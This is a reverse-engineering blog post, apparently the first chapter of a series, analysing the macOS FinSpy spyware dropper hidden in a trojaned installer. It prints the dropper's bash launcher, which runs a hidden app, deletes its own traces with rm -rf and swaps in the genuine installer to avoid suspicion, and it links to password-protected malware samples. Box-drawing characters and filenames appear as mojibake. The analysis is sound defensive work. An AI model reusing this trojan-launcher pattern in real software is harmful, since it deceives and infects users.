<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>The Finfisher Tales, Chapter 1: The dropper | Reverse Engineering</title><meta name=keywords content="malware,finfisher,finspy,backdoor,apt,nilephish,dropper,installer"><meta name=description content="Amnesty International finally dropped the bomb and released a report about FinSpy spyware made by FinFisher Gmbh.
The most interesting thing was the revelation of Mac and Linux versions, something that was missing from previous reports on this commercial malware (Kaspersky, Wikileaks)."><meta name=author content><link rel=canonical href=https://reverse.put.as/2020/09/26/the-finfisher-tales-chapter-1/><link crossorigin=anonymous href=/assets/css/stylesheet.f9dd9e48326c9379e713387f8e19bca159fa3c3f4b36907a4db01461f60456bb.css integrity="sha256-+d2eSDJsk3nnEzh/jhm8oVn6PD9LNpB6TbAUYfYEVrs=" rel="preload stylesheet" as=style><link rel=icon href=https://reverse.put.as/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://reverse.put.as/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://reverse.put.as/favicon-32x32.png><link rel=apple-touch-icon href=https://reverse.put.as/apple-touch-icon.png><link rel=mask-icon href=https://reverse.put.as/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><link rel=manifest href=/manifest.json><meta property="og:title" content="The Finfisher Tales, Chapter 1: The dropper"><meta property="og:description" content="Amnesty International finally dropped the bomb and released a report about FinSpy spyware made by FinFisher Gmbh.
The most interesting thing was the revelation of Mac and Linux versions, something that was missing from previous reports on this commercial malware (Kaspersky, Wikileaks)."><meta property="og:type" content="article"><meta property="og:url" content="https://reverse.put.as/2020/09/26/the-finfisher-tales-chapter-1/"><meta property="article:section" content="post"><meta property="article:published_time" content="2020-09-26T18:03:00+01:00"><meta property="article:modified_time" content="2020-09-26T18:03:00+01:00"><meta property="og:site_name" content="Reverse Engineering"><meta name=twitter:card content="summary"><meta name=twitter:title content="The Finfisher Tales, Chapter 1: The dropper"><meta name=twitter:description content="Amnesty International finally dropped the bomb and released a report about FinSpy spyware made by FinFisher Gmbh.
The most interesting thing was the revelation of Mac and Linux versions, something that was missing from previous reports on this commercial malware (Kaspersky, Wikileaks)."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://reverse.put.as/post/"},{"@type":"ListItem","position":2,"name":"The Finfisher Tales, Chapter 1: The dropper","item":"https://reverse.put.as/2020/09/26/the-finfisher-tales-chapter-1/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"The Finfisher Tales, Chapter 1: The dropper","name":"The Finfisher Tales, Chapter 1: The dropper","description":"Amnesty International finally dropped the bomb and released a report about FinSpy spyware made by FinFisher Gmbh.\nThe most interesting thing was the revelation of Mac and Linux versions, something that was missing from previous reports on this commercial malware (Kaspersky, Wikileaks).\n","keywords":["malware","finfisher","finspy","backdoor","apt","nilephish","dropper","installer"],"articleBody":"Amnesty International finally dropped the bomb and released a report about FinSpy spyware made by FinFisher Gmbh.\nThe most interesting thing was the revelation of Mac and Linux versions, something that was missing from previous reports on this commercial malware (Kaspersky, Wikileaks).\nTheir report summarizes the most important features but isnât technically deep. This got me interested in verifying if FinSpy for Mac was any good malicious software or just the same kind of bullshit commercial malware like HackingTeam (they finally went kaput, oh so many crocodile tears!).\nA couple of years ago I wrote a series about HackingTeam Crisis malware, which they loved according to Phineas Fisher hacking and leaks so, itâs time to do the same to FinFisher and FinSpy. A big thanks to Amnesty Internation for pulling the trigger on this one.\nThe report contains four macOS related hashes:\nHash Content 80d6e71c54fb3d4a904637e4d56e108a8255036cbb4760493b142889e47b951f Dropper 37e749b79f4a24ead2868dffdb22c5034053615fed1166fdea05b4ca43b65c83 Encrypted ZIP payload b5304d70dfe832c5a830762f8abc5bc9c4c6431f8ecfe80a6ae37b9d4cb430fd Persistence Plist 4f3003dd2ed8dcb68133f95c14e28b168bd0f52e5ae9842f528d3f7866495cea Trojaned DMG You can download them here. Password is âclowns!â.\nThere are two different versions in these files. The first three files belong to a apparently newer version extracted from Jabuka.app application, and the last one apparently an older version packaged in a trojaned application (caglayan-macos.dmg) used to infect targets. This post will be focused on the latter because itâs a complete package.\nThe following is the list of files available in the DMG.\n/Volumes/caglayan-macos/ âââ .fseventsd âÂ âââ fseventsd-uuid âââ Install\\ CÌ§agÌlayan.app âââ Contents âââ Info.plist âââ MacOS âÂ âââ .log âÂ âÂ âââ ARA0848.app âÂ âÂ âââ Contents âÂ âÂ âââ Info.plist âÂ âÂ âââ MacOS âÂ âÂ âÂ âââ installer âÂ âÂ âââ PkgInfo âÂ âÂ âââ Resources âÂ âÂ âââ English.lproj âÂ âÂ âÂ âââ InfoPlist.strings âÂ âÂ âÂ âââ MainMenu.nib âÂ âÂ âââ data âÂ âÂ âââ res âÂ âââ Install\\ CÌ§agÌlayan âÂ âââ installer âââ PkgInfo âââ Resources âÂ âââ Config.plist âÂ âââ CÌ§agÌlayan âÂ âÂ âââ Contents âÂ âÂ âââ Info.plist âÂ âÂ âââ MacOS âÂ âÂ âÂ âââ CÌ§agÌlayan âÂ âÂ âââ PkgInfo âÂ âÂ âââ Resources âÂ âÂ âÂ âââ DesktopReader.swf âÂ âÂ âÂ âââ Icon.icns âÂ âÂ âÂ âââ META-INF âÂ âÂ âÂ âÂ âââ AIR âÂ âÂ âÂ âÂ âÂ âââ application.xml âÂ âÂ âÂ âÂ âÂ âââ hash âÂ âÂ âÂ âÂ âââ signatures.xml âÂ âÂ âÂ âââ assets âÂ âÂ âÂ âÂ âââ LibraryLogo.png âÂ âÂ âÂ âÂ âââ accent-map.json âÂ âÂ âÂ âÂ âââ icons âÂ âÂ âÂ âÂ âÂ âââ Icon-128.png âÂ âÂ âÂ âÂ âÂ âââ Icon-16.png âÂ âÂ âÂ âÂ âÂ âââ Icon-32.png âÂ âÂ âÂ âÂ âÂ âââ Icon-48.png âÂ âÂ âÂ âÂ âÂ âââ Icon-desktop.png âÂ âÂ âÂ âÂ âââ info.xml âÂ âÂ âÂ âââ mimetype âÂ âÂ âÂ âââ native-utils âÂ âÂ âÂ âââ sqlite3 âÂ âÂ âââ _CodeSignature âÂ âÂ âââ CodeResources âÂ âââ ErrorDialog.nib âÂ âââ MainMenu.nib âÂ âââ NativeInstaller.icns âââ _CodeSignature âââ CodeResources 22 directories, 36 files Anything hidden inside MacOS folder is never a good sign. In this case we have the hidden .log folder that contains another application inside.\nWe can have a look at Info.plist to find out which binary is going to be executed when a user opens this application. The field we are interested in is CFBundleExecutable. It points to Install ÃaÄlayan. Assuming that the plist wasnât tampered with, the field BuildMachineOSBuild tells us that the original application was built in Mountain Lion latest release. This version was released in 2013.\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e \u003c!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"\u003e ","wordCount":"6618","inLanguage":"en","datePublished":"2020-09-26T18:03:00+01:00","dateModified":"2020-09-26T18:03:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://reverse.put.as/2020/09/26/the-finfisher-tales-chapter-1/"},"publisher":{"@type":"Organization","name":"Reverse Engineering","logo":{"@type":"ImageObject","url":"https://reverse.put.as/favicon.ico"}}}</script></head><body id=top><script crossorigin=anonymous src=/assets/js/theme.567f132bb6afa7942bdca6f777885f2494a00b008120e9d9a0b203d3a2a74e6d.js integrity="sha256-Vn8TK7avp5Qr3Kb3d4hfJJSgCwCBIOnZoLID06KnTm0="></script><header class=header><nav class=nav><div class=logo><a href=https://reverse.put.as/ accesskey=h title="  (Alt + H)"><img src=https://reverse.put.as/images/logo.png alt aria-label=logo height=40></a><div class=logo-switches><button id=theme-toggle accesskey=t title="Switch between dark and light mode"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button>
<button id=font-toggle title="Switch between serif and sans fonts"><svg id="fonton" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentcolor" class="bi bi-toggle-on" viewBox="0 0 16 16"><path d="M5 3a5 5 0 000 10h6a5 5 0 000-10H5zm6 9a4 4 0 110-8 4 4 0 010 8z"/></svg><svg id="fontoff" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentcolor" class="bi bi-toggle-off" viewBox="0 0 16 16"><path d="M11 4a4 4 0 010 8H8a4.992 4.992.0 002-4A4.992 4.992.0 008 4h3zm-6 8a4 4 0 110-8 4 4 0 010 8zM0 8a5 5 0 005 5h6a5 5 0 000-10H5A5 5 0 000 8z"/></svg></button></div></div><ul id=menu><li><a href=https://reverse.put.as/ title=Home><span>Home</span></a></li><li><a href=https://reverse.put.as/about/ title=About><span>About</span></a></li><li><a href=https://reverse.put.as/archives/ title=Archives><span>Archives</span></a></li><li><a href=https://reverse.put.as/crackmes/ title=Crackmes><span>Crackmes</span></a></li><li><a href=https://reverse.put.as/patches/ title=Patches><span>Patches</span></a></li><li><a href=https://reverse.put.as/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://papers.put.as title=Papers><span>Papers</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>The Finfisher Tales, Chapter 1: The dropper</h1><div class=post-meta><span title='2020-09-26 18:03:00 +0100 WEST'>September 26, 2020</span>&nbsp;Â·&nbsp;32 min&nbsp;Â·&nbsp;6618 words</div></header><div class=post-content><p>Amnesty International finally dropped the bomb and released a <a href=https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/>report</a> about FinSpy spyware made by FinFisher Gmbh.</p><p>The most interesting thing was the revelation of Mac and Linux versions, something that was missing from previous reports on this commercial malware (<a href=https://securelist.com/new-finspy-ios-and-android-implants-revealed-itw/91685/>Kaspersky</a>, <a href=https://wikileaks.org/spyfiles/docs/gamma/291_remote-monitoring-and-infection-solutions-finspy-mobile.html>Wikileaks</a>).</p><p>Their report summarizes the most important features but isn&rsquo;t technically deep. This got me interested in verifying if FinSpy for Mac was any good malicious software or just the same kind of bullshit commercial malware like HackingTeam (they finally went kaput, oh so many crocodile tears!).</p><p>A couple of years ago I wrote a series about HackingTeam Crisis malware, which they loved according to <a href=https://wikileaks.org/hackingteam/emails/>Phineas Fisher hacking and leaks</a> so, it&rsquo;s time to do the same to FinFisher and FinSpy. A big thanks to Amnesty Internation for pulling the trigger on this one.</p><p>The report contains four macOS related hashes:</p><table class=table><thead><tr><th style=text-align:left>Hash</th><th style=text-align:left>Content</th></tr></thead><tbody><tr><td style=text-align:left>80d6e71c54fb3d4a904637e4d56e108a8255036cbb4760493b142889e47b951f</td><td style=text-align:left>Dropper</td></tr><tr><td style=text-align:left>37e749b79f4a24ead2868dffdb22c5034053615fed1166fdea05b4ca43b65c83</td><td style=text-align:left>Encrypted ZIP payload</td></tr><tr><td style=text-align:left>b5304d70dfe832c5a830762f8abc5bc9c4c6431f8ecfe80a6ae37b9d4cb430fd</td><td style=text-align:left>Persistence Plist</td></tr><tr><td style=text-align:left>4f3003dd2ed8dcb68133f95c14e28b168bd0f52e5ae9842f528d3f7866495cea</td><td style=text-align:left>Trojaned DMG</td></tr></tbody></table><p>You can download them <a href=/files/2020/09/FinFisher_mac.7z>here</a>. Password is &lsquo;clowns!&rsquo;.</p><p>There are two different versions in these files. The first three files belong to a apparently newer version extracted from <code>Jabuka.app</code> application, and the last one apparently an older version packaged in a trojaned application (<code>caglayan-macos.dmg</code>) used to infect targets. This post will be focused on the latter because it&rsquo;s a complete package.</p><p>The following is the list of files available in the DMG.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/Volumes/caglayan-macos/
</span></span><span class=line><span class=cl>âââ .fseventsd
</span></span><span class=line><span class=cl>âÂ Â  âââ fseventsd-uuid
</span></span><span class=line><span class=cl>âââ Install<span class=se>\ </span>CÌ§agÌlayan.app
</span></span><span class=line><span class=cl>    âââ Contents
</span></span><span class=line><span class=cl>        âââ Info.plist
</span></span><span class=line><span class=cl>        âââ MacOS
</span></span><span class=line><span class=cl>        âÂ Â  âââ .log
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â  âââ ARA0848.app
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âââ Contents
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â          âââ Info.plist
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â          âââ MacOS
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â          âÂ Â  âââ installer
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â          âââ PkgInfo
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â          âââ Resources
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â              âââ English.lproj
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â              âÂ Â  âââ InfoPlist.strings
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â              âÂ Â  âââ MainMenu.nib
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â              âââ data
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â              âââ res
</span></span><span class=line><span class=cl>        âÂ Â  âââ Install<span class=se>\ </span>CÌ§agÌlayan
</span></span><span class=line><span class=cl>        âÂ Â  âââ installer
</span></span><span class=line><span class=cl>        âââ PkgInfo
</span></span><span class=line><span class=cl>        âââ Resources
</span></span><span class=line><span class=cl>        âÂ Â  âââ Config.plist
</span></span><span class=line><span class=cl>        âÂ Â  âââ CÌ§agÌlayan
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â  âââ Contents
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âââ Info.plist
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âââ MacOS
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âÂ Â  âââ CÌ§agÌlayan
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âââ PkgInfo
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âââ Resources
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âÂ Â  âââ DesktopReader.swf
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âÂ Â  âââ Icon.icns
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âÂ Â  âââ META-INF
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âÂ Â  âÂ Â  âââ AIR
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âÂ Â  âÂ Â  âÂ Â  âââ application.xml
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âÂ Â  âÂ Â  âÂ Â  âââ <span class=nb>hash</span>
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âÂ Â  âÂ Â  âââ signatures.xml
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âÂ Â  âââ assets
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âÂ Â  âÂ Â  âââ LibraryLogo.png
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âÂ Â  âÂ Â  âââ accent-map.json
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âÂ Â  âÂ Â  âââ icons
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âÂ Â  âÂ Â  âÂ Â  âââ Icon-128.png
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âÂ Â  âÂ Â  âÂ Â  âââ Icon-16.png
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âÂ Â  âÂ Â  âÂ Â  âââ Icon-32.png
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âÂ Â  âÂ Â  âÂ Â  âââ Icon-48.png
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âÂ Â  âÂ Â  âÂ Â  âââ Icon-desktop.png
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âÂ Â  âÂ Â  âââ info.xml
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âÂ Â  âââ mimetype
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âÂ Â  âââ native-utils
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âÂ Â      âââ sqlite3
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â      âââ _CodeSignature
</span></span><span class=line><span class=cl>        âÂ Â  âÂ Â          âââ CodeResources
</span></span><span class=line><span class=cl>        âÂ Â  âââ ErrorDialog.nib
</span></span><span class=line><span class=cl>        âÂ Â  âââ MainMenu.nib
</span></span><span class=line><span class=cl>        âÂ Â  âââ NativeInstaller.icns
</span></span><span class=line><span class=cl>        âââ _CodeSignature
</span></span><span class=line><span class=cl>            âââ CodeResources
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>22</span> directories, <span class=m>36</span> files
</span></span></code></pre></div><p>Anything hidden inside <code>MacOS</code> folder is never a good sign. In this case we have the hidden <code>.log</code> folder that contains another application inside.</p><p>We can have a look at <code>Info.plist</code> to find out which binary is going to be executed when a user opens this application. The field we are interested in is <code>CFBundleExecutable</code>. It points to <code>Install ÃaÄlayan</code>. Assuming that the plist wasn&rsquo;t tampered with, the field <code>BuildMachineOSBuild</code> tells us that the original application was built in Mountain Lion latest release. This version was released in 2013.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;no&#34;?&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;plist</span> <span class=na>version=</span><span class=s>&#34;1.0&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;dict&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;key&gt;</span>BuildMachineOSBuild<span class=nt>&lt;/key&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;string&gt;</span>12F45<span class=nt>&lt;/string&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;key&gt;</span>CFBundleAllowMixedLocalizations<span class=nt>&lt;/key&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;true/&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;key&gt;</span>CFBundleDevelopmentRegion<span class=nt>&lt;/key&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;string&gt;</span>English<span class=nt>&lt;/string&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;key&gt;</span>CFBundleExecutable<span class=nt>&lt;/key&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;string&gt;</span>Install ÃaÄlayan<span class=nt>&lt;/string&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;key&gt;</span>CFBundleIconFile<span class=nt>&lt;/key&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;string&gt;</span>NativeInstaller.icns<span class=nt>&lt;/string&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;key&gt;</span>CFBundleIdentifier<span class=nt>&lt;/key&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;string&gt;</span>com.coverpage.bluedome.caglayan.desktop.installer<span class=nt>&lt;/string&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;key&gt;</span>CFBundleInfoDictionaryVersion<span class=nt>&lt;/key&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;string&gt;</span>6.0<span class=nt>&lt;/string&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;key&gt;</span>CFBundlePackageType<span class=nt>&lt;/key&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;string&gt;</span>APPL<span class=nt>&lt;/string&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;key&gt;</span>CFBundleShortVersionString<span class=nt>&lt;/key&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;string&gt;</span>2.0<span class=nt>&lt;/string&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;key&gt;</span>DTCompiler<span class=nt>&lt;/key&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;string&gt;</span>com.apple.compilers.llvm.clang.1_0<span class=nt>&lt;/string&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;key&gt;</span>DTPlatformBuild<span class=nt>&lt;/key&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;string&gt;</span>4H1503<span class=nt>&lt;/string&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;key&gt;</span>DTPlatformVersion<span class=nt>&lt;/key&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;string&gt;</span>GM<span class=nt>&lt;/string&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;key&gt;</span>DTSDKBuild<span class=nt>&lt;/key&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;string&gt;</span>10K549<span class=nt>&lt;/string&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;key&gt;</span>DTSDKName<span class=nt>&lt;/key&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;string&gt;</span>macosx10.6<span class=nt>&lt;/string&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;key&gt;</span>DTXcode<span class=nt>&lt;/key&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;string&gt;</span>0463<span class=nt>&lt;/string&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;key&gt;</span>DTXcodeBuild<span class=nt>&lt;/key&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;string&gt;</span>4H1503<span class=nt>&lt;/string&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;key&gt;</span>LSMinimumSystemVersion<span class=nt>&lt;/key&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;string&gt;</span>10.6<span class=nt>&lt;/string&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;key&gt;</span>NSHumanReadableCopyright<span class=nt>&lt;/key&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;string/&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;key&gt;</span>NSMainNibFile<span class=nt>&lt;/key&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;string&gt;</span>MainMenu<span class=nt>&lt;/string&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;key&gt;</span>NSPrincipalClass<span class=nt>&lt;/key&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;string&gt;</span>NSApplication<span class=nt>&lt;/string&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/dict&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/plist&gt;</span>
</span></span></code></pre></div><p>The next step is to see what <code>Install ÃaÄlayan</code> contains.</p><div class="terminal space shadow"><div class=top><div class=btns><span class="circle red"></span>
<span class="circle yellow"></span>
<span class="circle green"></span></div><div class=title>bash</div></div><div class=terminalbody><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ file Install<span class=se>\ </span>CÌ§agÌlayan 
</span></span><span class=line><span class=cl>Install CÌ§agÌlayan: Bourne-Again shell script text executable, UTF-8 Unicode text
</span></span></code></pre></div></div></div><br><p>Normally we should expect a Mach-O executable instead of a shell script, so something fishy is going on. Let&rsquo;s take a look at its contents.</p><div class="terminal space shadow"><div class=top><div class=btns><span class="circle red"></span>
<span class="circle yellow"></span>
<span class="circle green"></span></div><div class=title>bash</div></div><div class=terminalbody><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cat Install<span class=se>\ </span>CÌ§agÌlayan 
</span></span><span class=line><span class=cl><span class=c1>#!/bin/bash</span>
</span></span><span class=line><span class=cl><span class=nv>BASEDIR</span><span class=o>=</span><span class=s2>&#34;</span><span class=k>$(</span> <span class=nb>cd</span> <span class=s2>&#34;</span><span class=k>$(</span>dirname <span class=s2>&#34;</span><span class=nv>$0</span><span class=s2>&#34;</span><span class=k>)</span><span class=s2>&#34;</span> <span class=o>&amp;&amp;</span> <span class=nb>pwd</span><span class=k>)</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>cd</span> <span class=s2>&#34;</span><span class=nv>$BASEDIR</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>open .log/ARA0848.app
</span></span><span class=line><span class=cl>sleep <span class=m>2</span>
</span></span><span class=line><span class=cl>rm Install<span class=se>\ </span>ÃaÄlayan
</span></span><span class=line><span class=cl>mv installer Install<span class=se>\ </span>ÃaÄlayan
</span></span><span class=line><span class=cl>rm -rf .log
</span></span><span class=line><span class=cl>./Install<span class=se>\ </span>ÃaÄlayan
</span></span><span class=line><span class=cl><span class=nb>exit</span>
</span></span></code></pre></div></div></div><br><p>The script executes the hidden application, then replaces itself with the original application binary, and finally executes it to avoid suspicion by the user. This means that we should focus our attention on the <code>installer</code> binary inside <code>ARA0848.app</code> application (because it&rsquo;s the binary that will be executed). The hidden application name <code>ARA0848.app</code> is different from <code>Jabuka.app</code> mentioned in Amnesty International report. The folder structure is the same and <code>installer</code> is described as the launcher/dropper.</p><p>The following picture describes the installation process:</p><p><img loading=lazy src=/images/2020/09/ff-3.png#center alt="installation chain"></p><p>The report discusses virtual machine detection and code obfuscation, so the next step is to load the <code>installer</code> binary into a disassembler (IDA in my case) and start reversing it.</p><p>The first thing we can notice is that the binary wasn&rsquo;t stripped because function names are available. Yeah I know, getting strip to work with Xcode is not straightforward! Also visible are Objective-C class/method names without obfuscation (some macOS adware families obfuscate the names with junk strings).</p><div class="terminal space shadow"><div class=top><div class=btns><span class="circle red"></span>
<span class="circle yellow"></span>
<span class="circle green"></span></div><div class=title>nm</div></div><div class=terminalbody><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ nm installer -s __TEXT __text 
</span></span><span class=line><span class=cl>000000010000594b t +<span class=o>[</span>GIFileOps baseAttributes<span class=o>]</span>
</span></span><span class=line><span class=cl>0000000100004c0c t +<span class=o>[</span>GIFileOps copy:to:<span class=o>]</span>
</span></span><span class=line><span class=cl>0000000100004de3 t +<span class=o>[</span>GIFileOps createDirectory:shouldDelete:<span class=o>]</span>
</span></span><span class=line><span class=cl>000000010000628b t +<span class=o>[</span>GIFileOps loadAgent:<span class=o>]</span>
</span></span><span class=line><span class=cl>0000000100004f4d t +<span class=o>[</span>GIFileOps move:to:<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=m>0000000100005128</span> t +<span class=o>[</span>GIFileOps remove:<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=m>0000000100005254</span> t +<span class=o>[</span>GIFileOps rename:to:<span class=o>]</span>
</span></span><span class=line><span class=cl>0000000100005f80 t +<span class=o>[</span>GIFileOps setDataFileAttributes:<span class=o>]</span>
</span></span><span class=line><span class=cl>00000001000059c1 t +<span class=o>[</span>GIFileOps setDirectoryAttributes:<span class=o>]</span>
</span></span><span class=line><span class=cl>0000000100005d44 t +<span class=o>[</span>GIFileOps setExecutableFileAttributes:<span class=o>]</span>
</span></span><span class=line><span class=cl>00000001000061bc t +<span class=o>[</span>GIFileOps setFile:withAttributes:<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=m>0000000100005737</span> t +<span class=o>[</span>GIFileOps setStandardAttributes:<span class=o>]</span>
